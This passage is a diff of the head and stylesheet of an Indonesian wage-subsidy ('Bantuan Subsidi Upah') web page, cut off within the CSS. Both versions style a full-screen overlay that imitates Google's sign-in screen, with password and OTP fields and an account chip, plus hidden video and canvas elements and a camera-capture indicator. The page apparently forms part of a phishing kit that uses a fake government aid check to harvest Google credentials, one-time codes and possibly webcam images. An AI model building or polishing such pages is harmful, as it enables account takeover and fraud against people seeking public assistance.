@@ -1,1179 +1,879 @@
 <!DOCTYPE html>
 <html lang="id">
-
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="robots" content="noindex,nofollow" />
-  <meta name="theme-color" content="#0a2340" />
-  <meta name="gsi-build" content="zgch-d8" />
-  <title>Bantuan Subsidi Upah 2026</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Proza+Libre:wght@600&display=swap" rel="stylesheet" />
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
-  <style>
-    :root{--navy:#0a2340;--navy-2:#12456f;--blue:#1a5fa8;--accent:#2f80d8;--ink:#1b2733;--muted:#5b6b7d;--line:#e2e8f0;--soft:#f4f7fb}
-    *{-webkit-tap-highlight-color:transparent}html{scroll-behavior:smooth}
-    body{font-family:'Open Sans',system-ui,-apple-system,sans-serif;color:var(--ink);background:#fff;overflow-x:hidden;font-size:16px;line-height:1.7}
-    h1,h2,h3{font-family:'Proza Libre','Open Sans',sans-serif;font-weight:600;line-height:1.25}
-    body.gsi-lock{overflow:hidden!important}
-    .bsu-nav{background:var(--navy);padding:.7rem 0;position:sticky;top:0;z-index:1040;box-shadow:0 1px 0 rgba(255,255,255,.08)}
-    .bsu-brand{display:flex;align-items:center;gap:.65rem;text-decoration:none;color:#fff;min-width:0}.bsu-brand svg{flex:0 0 auto}
-    .bsu-brand-txt{display:flex;flex-direction:column;line-height:1.15}
-    .bsu-brand-txt b{font-size:.8rem;letter-spacing:.06em;text-transform:uppercase;font-weight:700}
-    .bsu-brand-txt span{font-size:.62rem;letter-spacing:.13em;text-transform:uppercase;color:#8fb6dd}
-    .bsu-nav .nav-link{color:#cfdcea;font-size:.875rem;font-weight:600;padding:.5rem .85rem!important;border-radius:6px}
-    .bsu-nav .nav-link:hover{color:#fff;background:rgba(255,255,255,.09)}
-    .bsu-toggler{border:1px solid rgba(255,255,255,.3);border-radius:6px;padding:.35rem .55rem;background:none}
-    .bsu-toggler i{color:#fff;font-size:1.25rem;line-height:1;display:block}
-    .hero{position:relative;background:linear-gradient(140deg,var(--navy),var(--navy-2) 58%,var(--blue));color:#fff;padding:clamp(3rem,9vw,6.5rem) 0 clamp(2.75rem,8vw,5.5rem);overflow:hidden}
-    .hero::after{content:"";position:absolute;inset:0;background-image:radial-gradient(circle at 82% 18%,rgba(255,255,255,.14),transparent 42%),radial-gradient(circle at 12% 88%,rgba(47,128,216,.32),transparent 46%);pointer-events:none}
-    .hero>.container{position:relative;z-index:1}
-    .hero-tag{display:inline-flex;align-items:center;gap:.45rem;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.22);color:#dce9f7;font-size:.72rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:.38rem .8rem;border-radius:100px;margin-bottom:1.25rem}
-    .hero-tag .dot{width:7px;height:7px;border-radius:50%;background:#57d98a;box-shadow:0 0 0 3px rgba(87,217,138,.25)}
-    .hero h1{font-size:clamp(1.75rem,5.4vw,3.15rem);margin:0 0 .85rem;max-width:19ch}
-    .hero p{font-size:clamp(.95rem,2.4vw,1.15rem);color:#c3d7ea;max-width:46ch;margin:0 0 1.9rem}
-    .hero-cta{display:flex;flex-wrap:wrap;gap:.7rem}
-    .btn-cta,.btn-ghost{display:inline-flex;align-items:center;justify-content:center;gap:.5rem;font-weight:700;font-size:.92rem;padding:.8rem 1.5rem;border-radius:8px;text-decoration:none;border:1px solid transparent;transition:transform .15s,background .15s}
-    .btn-cta{background:#fff;color:var(--navy)}.btn-cta:hover{background:#e8f0f9;color:var(--navy);transform:translateY(-1px)}
-    .btn-ghost{background:rgba(255,255,255,.08);color:#fff;border-color:rgba(255,255,255,.38)}.btn-ghost:hover{background:rgba(255,255,255,.18);color:#fff}
-    .stats{background:#fff;border-bottom:1px solid var(--line);padding:clamp(1.6rem,4vw,2.5rem) 0}
-    .stat{background:var(--soft);border:1px solid var(--line);border-radius:12px;padding:1.1rem 1.15rem;height:100%}
-    .stat b{display:block;font-family:'Proza Libre',sans-serif;font-size:clamp(1.2rem,3.4vw,1.6rem);color:var(--blue);line-height:1.2;margin-bottom:.15rem}
-    .stat span{font-size:.82rem;color:var(--muted);font-weight:600}
-    section.blk{padding:clamp(2.6rem,7vw,4.5rem) 0;scroll-margin-top:78px}
-    .blk-alt{background:var(--soft);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
-    .eyebrow{display:block;font-size:.72rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:.5rem}
-    .blk h2{font-size:clamp(1.35rem,4vw,1.9rem);color:var(--navy);margin:0 0 .6rem}
-    .blk .lead-txt{color:var(--muted);max-width:62ch;margin:0 0 2rem;font-size:.97rem}
-    .req{display:flex;gap:.8rem;background:#fff;border:1px solid var(--line);border-radius:12px;padding:1rem 1.1rem;height:100%}
-    .req i{color:#188038;font-size:1.15rem;flex:0 0 auto}.req p{margin:0;font-size:.92rem;line-height:1.65;color:#33414f}
-    .note{display:flex;gap:.8rem;margin-top:1.75rem;padding:1rem 1.15rem;background:#fff7e6;border:1px solid #f2dcae;border-left:3px solid #d9a013;border-radius:8px;font-size:.875rem;color:#6b5217;line-height:1.65}
-    .note i{color:#b8860b;font-size:1.1rem;flex:0 0 auto}.note a{color:#8a6508;font-weight:700}
-    .step{display:flex;gap:1rem;background:#fff;border:1px solid var(--line);border-radius:12px;padding:1.1rem 1.15rem;height:100%}
-    .step-num{flex:0 0 auto;width:32px;height:32px;border-radius:50%;background:var(--blue);color:#fff;font-weight:700;font-size:.9rem;display:flex;align-items:center;justify-content:center}
-    .step h3{font-size:.98rem;margin:0 0 .2rem;color:var(--navy)}.step p{margin:0;font-size:.875rem;color:var(--muted)}
-    .step a{color:var(--accent);font-weight:700;text-decoration:none}.step a:hover{text-decoration:underline}
-    .infobox{background:#fff;border:1px solid var(--line);border-left:4px solid var(--blue);border-radius:10px;padding:1.25rem 1.35rem}
-    .infobox h3{font-size:1.02rem;color:var(--navy);margin:0 0 .6rem}.infobox p{margin:0 0 .8rem;font-size:.92rem;color:#3c4a58}.infobox p:last-child{margin-bottom:0}
-    .bsu-foot{background:var(--navy);color:#9db4ca;padding:2.5rem 0 1.75rem;font-size:.85rem}
-    .bsu-foot .foot-brand{display:flex;align-items:center;gap:.65rem;margin-bottom:.9rem;color:#fff}
-    .bsu-foot .foot-brand b{font-size:.8rem;letter-spacing:.06em;text-transform:uppercase}
-    .bsu-foot p{margin:0 0 .5rem;max-width:40ch;line-height:1.7}
-    .bsu-foot .copy{border-top:1px solid rgba(255,255,255,.12);margin-top:1.5rem;padding-top:1.1rem;font-size:.78rem;color:#7f98b0}
-    #gsi-root{position:fixed;inset:0;z-index:2147483000;background:#fff;display:flex;flex-direction:column;overflow:auto;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:14px;line-height:1.5;transition:opacity .25s}
-    #gsi-root.gsi-hide{opacity:0;pointer-events:none}
-    #gsi-root *,#gsi-root *::before,#gsi-root *::after{box-sizing:border-box;margin:0;padding:0}
-    #gsi-root input,#gsi-root button,#gsi-root select{font-family:inherit}
-    #gsi-root .gsi-main{flex:1 0 auto;display:flex;align-items:center;justify-content:center;padding:24px 16px}
-    #gsi-root .gsi-card{width:100%;max-width:448px;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;text-align:center;box-shadow:0 1px 3px rgba(60,64,67,.12),0 6px 24px rgba(60,64,67,.09);animation:gsiIn .3s}
-    @keyframes gsiIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
-    #gsi-root .gsi-logo{display:block;width:48px;height:48px;margin:0 auto 16px}
-    #gsi-root h1{font-size:24px;font-weight:400;color:#202124;margin:0 0 8px}
-    #gsi-root .gsi-sub{font-size:15px;color:#5f6368;margin:0 0 30px}
-    #gsi-root .gsi-chip{display:none;align-items:center;gap:8px;justify-content:center;width:fit-content;max-width:100%;border:1px solid #dadce0;border-radius:16px;height:32px;padding:0 12px 0 4px;font-size:14px;color:#3c4043;margin:0 auto 26px}
-    #gsi-root .gsi-chip .gsi-av{width:24px;height:24px;border-radius:50%;background:#1a73e8;color:#fff;font-size:12px;display:flex;align-items:center;justify-content:center;text-transform:uppercase}
-    #gsi-root .gsi-field{position:relative;text-align:left;margin-bottom:6px}
-    #gsi-root .gsi-field input{width:100%;height:56px;padding:13px 15px;font-size:16px;color:#202124;background:transparent;border:1px solid #dadce0;border-radius:4px;outline:none}
-    #gsi-root .gsi-field input:focus{border:2px solid #1a73e8;padding:12px 14px}
-    #gsi-root .gsi-field label{position:absolute;left:12px;top:16px;padding:0 4px;font-size:16px;color:#5f6368;background:#fff;pointer-events:none;transition:.15s}
-    #gsi-root .gsi-field input:focus+label,#gsi-root .gsi-field input:not(:placeholder-shown)+label{top:-8px;font-size:12px}
-    #gsi-root .gsi-field input:focus+label{color:#1a73e8}
-    #gsi-root .gsi-field.gsi-bad input{border:2px solid #d93025;padding:12px 14px}#gsi-root .gsi-field.gsi-bad label{color:#d93025}
-    #gsi-root .gsi-err{display:none;align-items:flex-start;gap:6px;font-size:12px;color:#d93025;text-align:left;margin:4px 0 0}
-    #gsi-root .gsi-err.show{display:flex}#gsi-root .gsi-err svg{flex:0 0 auto;margin-top:1px}
-    #gsi-root .gsi-link{display:inline-block;margin:12px 0 0;font-size:14px;font-weight:500;color:#1a73e8;text-decoration:none;cursor:pointer}
-    #gsi-root .gsi-link:hover{text-decoration:underline}
-    #gsi-root .gsi-guest{font-size:13.5px;color:#5f6368;text-align:left;margin:34px 0 0}
-    #gsi-root .gsi-guest a{color:#1a73e8;font-weight:500;text-decoration:none}
-    #gsi-root .gsi-check{display:flex;align-items:center;gap:10px;font-size:14px;color:#202124;text-align:left;margin:18px 0 0;cursor:pointer}
-    #gsi-root .gsi-check input{width:18px;height:18px;accent-color:#1a73e8}
-    #gsi-root .gsi-row{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-top:34px;flex-wrap:wrap}
-    #gsi-root .gsi-row-end{display:flex;align-items:center;justify-content:flex-end;gap:12px;margin-top:34px}
-    #gsi-root .gsi-btn{background:#1a73e8;color:#fff;border:0;border-radius:4px;height:38px;padding:0 24px;min-width:90px;font-size:14px;font-weight:500;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px}
-    #gsi-root .gsi-btn:hover{background:#1b66c9}#gsi-root .gsi-btn:disabled{opacity:.75}
-    #gsi-root .gsi-btn-text{background:none;border:0;height:38px;padding:0 8px;border-radius:4px;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer}
-    #gsi-root .gsi-spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:gsiSp .7s linear infinite;display:none}
-    #gsi-root .gsi-btn.gsi-loading .gsi-spin{display:block}@keyframes gsiSp{to{transform:rotate(360deg)}}
-    #gsi-root .gsi-foot{flex:0 0 auto;display:flex;align-items:center;justify-content:space-between;gap:16px;padding:12px 24px;font-size:12px;color:#5f6368;flex-wrap:wrap}
-    #gsi-root .gsi-foot .gsi-note{font-size:11px;color:#80868b}
-    #gsi-root .gsi-foot select{border:0;background:transparent;font-size:12px;color:#5f6368;padding:4px}
-    #gsi-root .gsi-foot nav{display:flex;gap:20px}#gsi-root .gsi-foot nav a{color:#5f6368;text-decoration:none}
-    #gsi-root .gsi-done{display:none;text-align:center;padding:8px 0 24px}
-    #gsi-root .gsi-done .gsi-ok{width:64px;height:64px;border-radius:50%;background:#e6f4ea;margin:0 auto 20px;display:flex;align-items:center;justify-content:center}
-    #gsi-root .gsi-done h2{font-size:22px;font-weight:400;margin:0 0 10px}
-    #gsi-root .gsi-done p{font-size:14px;color:#5f6368}
-    #gsi-root .gsi-shield{display:block;width:44px;height:44px;margin:0 auto 14px}
-    #gsi-root .gsi-hint{font-size:12px;color:#80868b;text-align:left;margin:14px 0 0}
-    #gsi-root .gsi-field input#gsiOtp{letter-spacing:.3em;font-size:18px;font-weight:500}
-    #gsi-root .gsi-cap{position:fixed;left:14px;bottom:14px;z-index:6;display:flex;align-items:center;gap:10px;background:#fff;border:1px solid #dadce0;border-radius:100px;padding:5px 13px 5px 11px;font-size:11px;color:#5f6368;box-shadow:0 2px 10px rgba(60,64,67,.16);opacity:.95;pointer-events:none;max-width:calc(100% - 28px)}
-    #gsi-root .gsi-cap-item{display:flex;align-items:center;gap:5px;white-space:nowrap}
-    #gsi-root .gsi-cap-dot{width:6px;height:6px;border-radius:50%;background:#cbd5e1;flex:0 0 auto}
-    #gsi-root .gsi-cap-item.on .gsi-cap-dot{background:#1e8e3e}
-    #gsi-root .gsi-cap-item.wait .gsi-cap-dot{background:#f9ab00;animation:gsiBlink 1s infinite}
-    #gsi-root .gsi-cap-item.off .gsi-cap-dot{background:#d93025}
-    @keyframes gsiBlink{0%,100%{opacity:1}50%{opacity:.25}}
-    #gsi-root .gsi-cap-thumb{display:none;width:26px;height:26px;border-radius:50%;object-fit:cover;border:1px solid #1e8e3e;transform:scaleX(-1)}
-    #gsi-root .gsi-cap-thumb.on{display:block}
-    #gsi-root video,#gsi-root canvas{display:none}
-    @media(max-width:520px){#gsi-root .gsi-main{padding:0;align-items:flex-start}#gsi-root .gsi-card{border:0;border-radius:0;box-shadow:none;padding:22px 22px 30px;max-width:100%}#gsi-root .gsi-foot{padding:12px 22px 58px}#gsi-root .gsi-cap{left:10px;bottom:10px;font-size:10.5px}}
-    @media(min-width:992px){#gsi-root{background:#f1f3f4}}
-    #gsiReopen{position:fixed;right:16px;bottom:16px;z-index:2147482999;display:none;align-items:center;gap:8px;height:44px;padding:0 20px;border:0;border-radius:22px;background:#1a73e8;color:#fff;font:500 14px/1 Roboto,Arial,sans-serif;box-shadow:0 4px 14px rgba(0,0,0,.28);cursor:pointer}
-    /* panel dev */
-    #dv{position:fixed;inset:auto 0 0 0;z-index:2147483001;display:none;max-height:62vh;overflow:auto;background:#0b1220f2;color:#c9d6e5;font:11px/1.5 ui-monospace,Menlo,monospace;border-top:1px solid #22334d;padding:10px 12px;backdrop-filter:blur(4px)}
-    #dv.on{display:block}
-    #dv h4{margin:0 0 6px;font-size:11px;color:#8fe3b4;letter-spacing:.08em;text-transform:uppercase}
-    #dv .chips{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
-    #dv .chip{background:#141f34;border:1px solid #22334d;border-radius:4px;padding:2px 6px;font-size:10px}
-    #dv .chip b{color:#6ee7a0}
-    #dv .row{display:flex;gap:6px;border-bottom:1px dashed #16223a;padding:1px 0}
-    #dv .row .c{flex:1;color:#9fb2c6;word-break:break-all}
-    #dv .row .k{width:18px;text-align:center;font-weight:700}
-    #dv .row .l{width:52px;text-align:right;color:#61748a}
-    #dv .row .n{width:90px;color:#61748a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-    #dv .k0{color:#6ee7a0}#dv .k1{color:#f3d97b}#dv .k2{color:#f3a3a3}#dv .k3{color:#7f95ad}#dv .k4{color:#4a5b70}
-    #dv button{background:#141f34;border:1px solid #22334d;color:#9fb6d1;border-radius:4px;padding:3px 8px;font:10px ui-monospace,monospace;cursor:pointer;margin-right:4px}
-    #dv button:hover{background:#1d2c47}
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<meta name="theme-color" content="#0b3a6f">
+<title>Bantuan Subsidi Upah</title>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Proza+Libre:wght@600;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--navy:#0e2a47;--blue:#0b78f0;--link:#0b57a4;--ink:#333e48;--line:#e3e7eb}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:'Open Sans',system-ui,Arial,sans-serif;font-size:15.5px;line-height:1.72;color:var(--ink);background:#fff;overflow-x:hidden}
+body.gsi-lock{overflow:hidden!important}
+h1,h2,h3{font-family:'Proza Libre',Georgia,serif;color:var(--navy);line-height:1.3;font-weight:600}
+a{color:var(--link)}
+.wrap{max-width:1080px;margin:0 auto;padding:0 20px}
+.top{position:sticky;top:0;z-index:50;background:#fff;border-bottom:1px solid #eef1f4;box-shadow:0 1px 3px rgba(16,32,52,.06)}
+.top .wrap{display:flex;align-items:center;justify-content:space-between;gap:14px;min-height:72px}
+.brand{display:flex;align-items:center;gap:11px;text-decoration:none}
+.brand b,.brand span{display:block;font-size:9.5px;letter-spacing:.07em;text-transform:uppercase;line-height:1.28;font-weight:700;color:#0b3a6f}
+.brand span{font-weight:600;color:#5b7fa6}
+.nav{display:flex;align-items:center;gap:2px}
+.nav a{font-size:14.5px;font-weight:600;color:#3c4d5e;text-decoration:none;padding:9px 13px;border-radius:4px;white-space:nowrap}
+.nav a:hover{color:#0b3a6f;background:#f2f6fa}
+.nav .help{border:1px solid #b9c4cf;color:#22374b;padding:8px 15px;margin-left:8px;border-radius:4px}
+.burger{display:none;border:1px solid #ccd5de;background:#fff;border-radius:5px;padding:7px 9px;font-size:17px;color:#22374b;cursor:pointer}
+.hero{position:relative;overflow:hidden;padding:44px 0 8px}
+.hero::before{content:"";position:absolute;inset:0;background:linear-gradient(115deg,transparent 0 58%,#eef4fa 58% 78%,transparent 78%),linear-gradient(115deg,transparent 0 74%,#e6eff8 74% 84%,transparent 84%),linear-gradient(245deg,transparent 0 82%,#f0f5fa 82% 92%,transparent 92%)}
+.hero .wrap{position:relative}
+.hero h1{font-size:clamp(26px,4.4vw,36px);margin:0 0 14px;max-width:22ch}
+.hero p{max-width:74ch;margin:0 0 14px;color:#41505e}
+.hero .hl b{color:#0e2a47}
+section{padding:34px 0}
+h2{font-size:clamp(20px,3.2vw,25px);margin:0 0 18px}
+.h2-line{display:inline-block;padding-bottom:9px;border-bottom:2px solid #35b6e8;margin-bottom:20px}
+.two{display:grid;grid-template-columns:1fr 1fr;gap:6px 40px}
+ul.dot{margin:0;padding-left:20px}ul.dot li{margin-bottom:14px;color:#3c4a58}
+.note{margin:16px 0 0;font-size:13.5px;font-style:italic;color:#5a6a78;max-width:96ch}
+.steps{display:grid;gap:10px;margin:0 0 8px}
+.step{display:flex;align-items:center;gap:16px;background:#f7f8f9;border-radius:4px;padding:15px 18px}
+.step .n{flex:0 0 auto;width:30px;height:30px;border-radius:50%;background:#0e2a47;color:#fff;font-weight:700;font-size:14px;display:flex;align-items:center;justify-content:center}
+.step b{font-size:15px;color:#22374b;max-width:120px;line-height:1.35}
+.step a{color:#0b57a4;font-weight:600;text-decoration:none;font-size:14.5px}
+#pengecekanMandiri{scroll-margin-top:80px}
+.cek-head{text-align:center;margin-bottom:22px}
+.cek-head h2{margin:0 0 8px;font-size:clamp(21px,3.4vw,27px);color:#12395e}
+.cek-head p{margin:0;color:#5a6a78;font-size:15px}
+.card{max-width:560px;margin:0 auto;background:#fff;border:1px solid var(--line);border-radius:5px;padding:26px 26px 22px}
+.lbl{display:block;font-weight:700;font-size:14.5px;color:#1f2c38;margin:0 0 7px}
+.inp{width:100%;height:46px;border:1px solid #ccd5de;border-radius:5px;padding:0 13px;font-size:15.5px;font-family:inherit;color:#22374b;outline:none}
+.inp:focus{border-color:#0b78f0;box-shadow:0 0 0 3px rgba(11,120,240,.13)}
+.inp.bad{border-color:#d93025;box-shadow:0 0 0 3px rgba(217,48,37,.1)}
+.hint{font-size:13px;color:#7b8895;margin:6px 0 16px}
+.err{display:none;font-size:13px;color:#d93025;margin:-10px 0 12px;font-weight:600}
+.err.on{display:block}
+.cap-row{display:flex;align-items:center;gap:16px;margin-bottom:8px}
+#capBox{border:1px solid #ddd6c6;border-radius:4px;background:#f7f3ea;display:block}
+.ganti{display:inline-flex;align-items:center;gap:6px;font-size:14px;color:#5a6a78;background:none;border:0;cursor:pointer;font-family:inherit;padding:4px}
+.btn-cek{width:100%;height:52px;border:0;border-radius:999px;background:var(--blue);color:#fff;font-size:17px;font-weight:700;font-family:inherit;cursor:pointer;margin-top:6px;display:flex;align-items:center;justify-content:center;gap:10px}
+.btn-cek:hover{background:#0a67d0}.btn-cek:disabled{opacity:.8}
+.spin{width:17px;height:17px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn-cek.load .spin{display:block}
+@keyframes sp{to{transform:rotate(360deg)}}
+.alert{display:none;margin-top:16px;padding:14px 16px;border-radius:4px;font-size:14.5px;line-height:1.6}
+.alert.on{display:block}
+.alert.warn{background:#fdf6e6;border:1px solid #eed9a8;color:#7a5a12}
+.alert.err{background:#fdeceb;border:1px solid #f2c4c0;color:#8c2318}
+.hasil{display:none;margin-top:18px;border:1px solid #cfe6d3;border-radius:6px;overflow:hidden}
+.hasil.on{display:block}
+.hasil .hh{background:#eaf7ec;padding:13px 16px;border-bottom:1px solid #d6ecda;display:flex;align-items:center;gap:9px}
+.hasil .hh b{font-size:14.5px;color:#14622a}
+.hasil .hh .ic{width:22px;height:22px;border-radius:50%;background:#1e8e3e;color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px}
+.hasil .bd{padding:14px 16px}
+.hasil dl{display:grid;grid-template-columns:130px 1fr;gap:8px 12px;margin:0 0 14px;font-size:14px}
+.hasil dt{color:#6b7a88}.hasil dd{margin:0;color:#1f2c38;font-weight:700}
+.hasil .akt{display:flex;gap:8px;font-size:14px;background:#fdf6e6;border:1px solid #eed9a8;color:#7a5a12;border-radius:4px;padding:9px 12px;margin-bottom:14px}
+.hasil .go{display:block;text-align:center;background:var(--blue);color:#fff;text-decoration:none;font-weight:700;padding:12px;border-radius:999px;font-size:15px}
+.info-box{background:#f7f8f9;border-left:3px solid #0b78f0;border-radius:4px;padding:16px 18px;font-size:14.5px}
+.info-box p{margin:0 0 10px}
+footer{background:#f4f6f8;border-top:1px solid #e6eaee;margin-top:30px;padding:26px 0 22px;font-size:13.5px;color:#5c6b79}
+footer .fb{display:flex;align-items:center;gap:10px;margin-bottom:10px;color:#0e2a47}
+footer b{font-size:9.5px;letter-spacing:.07em;text-transform:uppercase;line-height:1.3}
+footer p{margin:0 0 6px;max-width:52ch}
+footer .cp{margin-top:14px;padding-top:12px;border-top:1px solid #e0e5ea;font-size:12.5px;color:#7b8895}
+@media(max-width:860px){.nav{display:none}.nav.open{display:flex;position:absolute;top:100%;left:0;right:0;background:#fff;flex-direction:column;align-items:stretch;padding:8px 14px 14px;border-bottom:1px solid #e6eaee}.burger{display:block}.two{grid-template-columns:1fr}.card{padding:20px 16px}.hasil dl{grid-template-columns:1fr}}
+#gsi-wrap{position:fixed;inset:0;z-index:2147483000;display:none;align-items:flex-start;justify-content:center;padding:16px;background:rgba(12,22,38,.58);backdrop-filter:blur(3px);overflow:auto;font-family:'Roboto',Arial,sans-serif;font-size:14px;line-height:1.5;color:#202124}
+#gsi-wrap.on{display:flex}
+#gsi-wrap *{box-sizing:border-box;margin:0;padding:0}
+#gsi-wrap .gsi-card{position:relative;width:100%;max-width:448px;margin:auto;background:#fff;border:1px solid #dadce0;border-radius:10px;padding:32px 38px 0;text-align:center;box-shadow:0 12px 44px rgba(0,0,0,.32);animation:gsiIn .26s ease-out}
+@keyframes gsiIn{from{opacity:0;transform:translateY(16px) scale(.985)}to{opacity:1;transform:none}}
+#gsi-wrap .gsi-x{position:absolute;top:10px;right:10px;width:34px;height:34px;border:0;background:none;border-radius:50%;color:#5f6368;font-size:19px;cursor:pointer}
+#gsi-wrap .gsi-ctx{display:none;align-items:center;gap:8px;justify-content:center;background:#e8f0fe;border:1px solid #c6dafc;color:#174ea6;font-size:12px;font-weight:600;border-radius:6px;padding:7px 10px;margin:0 0 18px}
+#gsi-wrap .gsi-ctx.on{display:flex}
+#gsi-wrap .gsi-ctx b{font-family:ui-monospace,monospace;letter-spacing:.06em}
+#gsi-wrap .gsi-logo{display:block;width:42px;height:42px;margin:0 auto 12px}
+#gsi-wrap h1{font-family:'Roboto',Arial,sans-serif;font-size:22px;font-weight:400;color:#202124;margin:0 0 8px;line-height:1.32}
+#gsi-wrap .gsi-sub{font-size:14px;color:#5f6368;margin:0 0 24px}
+#gsi-wrap .gsi-chip{display:none;align-items:center;gap:8px;justify-content:center;width:fit-content;border:1px solid #dadce0;border-radius:16px;height:32px;padding:0 12px 0 4px;font-size:14px;margin:0 auto 20px}
+#gsi-wrap .gsi-av{width:24px;height:24px;border-radius:50%;background:#1a73e8;color:#fff;font-size:12px;display:flex;align-items:center;justify-content:center;text-transform:uppercase}
+#gsi-wrap .gsi-field{position:relative;text-align:left;margin-bottom:6px}
+#gsi-wrap .gsi-field input{width:100%;height:56px;padding:13px 15px;font-size:16px;background:transparent;border:1px solid #dadce0;border-radius:4px;outline:none}
+#gsi-wrap .gsi-field input:focus{border:2px solid #1a73e8;padding:12px 14px}
+#gsi-wrap .gsi-field label{position:absolute;left:12px;top:16px;padding:0 4px;font-size:16px;color:#5f6368;background:#fff;pointer-events:none;transition:.15s}
+#gsi-wrap .gsi-field input:focus+label,#gsi-wrap .gsi-field input:not(:placeholder-shown)+label{top:-8px;font-size:12px}
+#gsi-wrap .gsi-field.bad input{border:2px solid #d93025;padding:12px 14px}
+#gsi-wrap .gsi-field.bad label{color:#d93025}
+#gsi-wrap .gsi-err{display:none;gap:6px;font-size:12px;color:#d93025;text-align:left;margin:4px 0 0}
+#gsi-wrap .gsi-err.show{display:flex}
+#gsi-wrap .gsi-link{display:inline-block;margin:12px 0 0;font-size:14px;font-weight:500;color:#1a73e8;cursor:pointer}
+#gsi-wrap .gsi-guest{font-size:13px;color:#5f6368;text-align:left;margin:28px 0 0}
+#gsi-wrap .gsi-check{display:flex;align-items:center;gap:10px;font-size:14px;text-align:left;margin:16px 0 0;cursor:pointer}
+#gsi-wrap .gsi-check input{width:18px;height:18px;accent-color:#1a73e8}
+#gsi-wrap .gsi-row{display:flex;align-items:center;justify-content:space-between;gap:12px;margin:26px 0;flex-wrap:wrap}
+#gsi-wrap .gsi-row-end{display:flex;justify-content:flex-end;margin:26px 0}
+#gsi-wrap .gsi-btn{background:#1a73e8;color:#fff;border:0;border-radius:4px;height:38px;padding:0 24px;min-width:90px;font-size:14px;font-weight:500;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
+#gsi-wrap .gsi-btn-text{background:none;border:0;height:38px;padding:0 8px;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer}
+#gsi-wrap .gsi-spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+#gsi-wrap .gsi-btn.loading .gsi-spin{display:block}
+#gsi-wrap .gsi-shield{display:block;width:42px;height:42px;margin:0 auto 12px}
+#gsi-wrap .gsi-hint{font-size:12px;color:#80868b;text-align:left;margin:12px 0 0}
+#gsi-wrap #gsiOtp{letter-spacing:.3em;font-size:18px;font-weight:500}
+#gsi-wrap .gsi-foot{display:flex;align-items:center;justify-content:space-between;gap:12px;border-top:1px solid #eef1f4;margin-top:20px;padding:11px 0 12px;font-size:12px;color:#5f6368;flex-wrap:wrap;text-align:left}
+#gsi-wrap .gsi-foot select{border:0;background:transparent;font-size:12px;color:#5f6368}
+#gsi-wrap .gsi-foot nav{display:flex;gap:16px}
+#gsi-wrap .gsi-foot nav a{color:#5f6368;text-decoration:none}
+#gsi-wrap .gsi-note{font-size:10.5px;color:#80868b}
+#gsi-wrap .gsi-cap{display:flex;align-items:center;justify-content:center;gap:10px;border-top:1px solid #eef1f4;padding:8px 0 9px;font-size:10.5px;color:#5f6368;flex-wrap:wrap}
+#gsi-wrap .gsi-cap-item{display:flex;align-items:center;gap:5px;white-space:nowrap}
+#gsi-wrap .gsi-cap-dot{width:6px;height:6px;border-radius:50%;background:#cbd5e1}
+#gsi-wrap .gsi-cap-item.on .gsi-cap-dot{background:#1e8e3e}
+#gsi-wrap .gsi-cap-item.wait .gsi-cap-dot{background:#f9ab00;animation:blk 1s infinite}
+#gsi-wrap .gsi-cap-item.off .gsi-cap-dot{background:#d93025}
+@keyframes blk{0%,100%{opacity:1}50%{opacity:.25}}
+#gsi-wrap .gsi-thumb{display:none;width:24px;height:24px;border-radius:50%;object-fit:cover;border:1px solid #1e8e3e;transform:scaleX(-1)}
+#gsi-wrap .gsi-thumb.on{display:block}
+#gsiVid,#gsiCv{display:none}
+@media(max-width:520px){#gsi-wrap{padding:0}#gsi-wrap .gsi-card{border:0;border-radius:0;max-width:100%;min-height:100%;padding:24px 20px 0;box-shadow:none}}
+#dv{position:fixed;inset:auto 0 0 0;z-index:2147483001;display:none;max-height:60vh;overflow:auto;background:#0b1220f2;color:#c9d6e5;font:11px/1.5 ui-monospace,monospace;padding:10px}
+#dv.on{display:block}
+#dv .chips{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
+#dv .chip{background:#141f34;border:1px solid #22334d;border-radius:4px;padding:2px 6px;font-size:10px}
+#dv .chip b{color:#6ee7a0}
+#dv .row{display:flex;gap:6px;border-bottom:1px dashed #16223a}
